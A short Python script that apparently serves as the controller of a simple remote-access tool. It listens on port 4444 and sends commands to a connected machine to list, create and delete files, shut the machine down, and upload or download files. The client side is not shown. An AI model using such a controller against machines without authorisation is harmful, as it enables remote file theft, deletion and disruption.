
import socket
from typing import Tuple
import os

from signal import signal, SIGPIPE, SIG_DFL   
#Ignore SIG_PIPE and don't throw exceptions on it... (http://docs.python.org/library/signal.html)  
signal(SIGPIPE,SIG_DFL)   

IP = "172.29.217.159"

PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST : Tuple = (IP, PORT)

s.bind(HOST)


s.listen(1)

conn, addr = s.accept()

commands = ["ping", "ls", "cd", "mkdir", "rmdir","ifconfig", "uploadf", "downloadf", "touch", "rm", "clear", "pwd", "shutdown"]

print("{} Connected to server".format(addr))
print("")
while 1:

   cmd = input(">>>")
    
   if cmd == "ping" or cmd == "ls" or cmd == "pwd" or cmd == "ifconfig" or cmd == "shutdown":

      conn.send(cmd.encode("utf-8"))
      print(conn.recv(1024).decode("utf-8"))
   


   if cmd == "clear" : 
      os.system("clear")

   if cmd == "touch" or cmd == "cd" or cmd == "rm" or cmd == "mkdir" or cmd == "rmdir":
      conn.send(cmd.encode("utf-8"))
      

      file = input("Choose: ")

      conn.send(file.encode("utf-8"))
      print(conn.recv(1024).decode("utf-8"))

 
   
   if cmd == "downloadf":
      conn.send(cmd.encode("utf-8"))
      file = input("Choose: ")

      conn.send(file.encode("utf-8"))
      text = conn.recv(1024).decode("utf-8")
      
      with open(file, "w+") as f:
         f.write(text)


   if cmd == "uploadf":

      conn.send(cmd.encode("utf-8"))
      file = input("Choose: ")

      conn.send(file.encode("utf-8"))
      
      
      with open(file, "r") as f:
         
         conn.send(f.read().encode("utf-8"))

      output = conn.recv(1024).decode("utf-8")
      print(output)



   elif cmd not in commands:
      print("That command does not exist.\n")
      print("All commands: {}".format(str(commands)))


